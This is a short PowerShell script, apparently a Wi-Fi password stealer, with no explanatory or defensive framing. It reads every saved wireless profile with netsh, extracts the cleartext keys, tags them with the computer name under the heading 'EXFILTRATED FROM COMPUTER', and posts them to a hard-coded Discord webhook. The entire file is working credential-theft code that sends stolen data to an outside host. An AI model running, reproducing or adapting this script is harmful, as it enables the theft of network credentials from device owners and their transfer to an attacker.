#Webhook URL
$webhookUri = "https://discord.com/api/webhooks/1053661383666974740/Nx1h0W7lgBgJV33VWdcrZLmWKhx-S0FCcdOC7AzHYSDhen3eU1dknRAOVg24Cud0bfxP"

#Get List of SSIDS
$SSIDS = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+" | Where-Object {$_ -ne ""}

#initiate Embed Array var
[System.Collections.ArrayList]$embedArray = @()
$description = ""
$color = "4289797"

#A loop to get password for each SSID
$WifiInfo = foreach($SSID in $SSIDS) {

    # Check if output is in French or English
    $output = netsh wlan show profiles name="$SSID" key=clear
	
	#Embed Title
	$title = "EXFILTRATED FROM COMPUTER : " + $env:computername
	
	#IF Output of netsh is french
	if ($output -match "Paramètres de sécurité"){
		
		#IF output have a password key
		if ($output -match "Contenu de la clé" ){
			$Password = ($output | Select-String 'Contenu de la clé') -replace ".*:\s+"
			$description = "**Network:** " + $SSID + "
**Password:** " + $Password
		}else{
			$description = "**Network:** " + $SSID + "
**Password:** No Password"
		}
		
	}
		
	
	#IF Output of netsh is English
	if ($output -match "Security settings"){
		
		#IF output have a password key
		if ($output -match "Key Content"){
			$Password = ($output | Select-String 'Key Content') -replace ".*:\s+"
			$description = "**Network:** " + $SSID + "
**Password:** " + $Password
		}else{
			$description = "**Network:** " + $SSID + "
**Password:** No Password"
		}
		
	}
	
	#Create Embed Object
	$embedObject = [PSCustomObject]@{
		color = $color
		title = $title
		description = $description
	}

	#Add Object to Array
	$embedArray.Add($embedObject)
	
	#Creating the embed
	$payload = [PSCustomObject]@{
		embeds = $embedArray
	}
	   
	
   
}
#Send data using REST method
Invoke-RestMethod -Uri $webHookUri -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'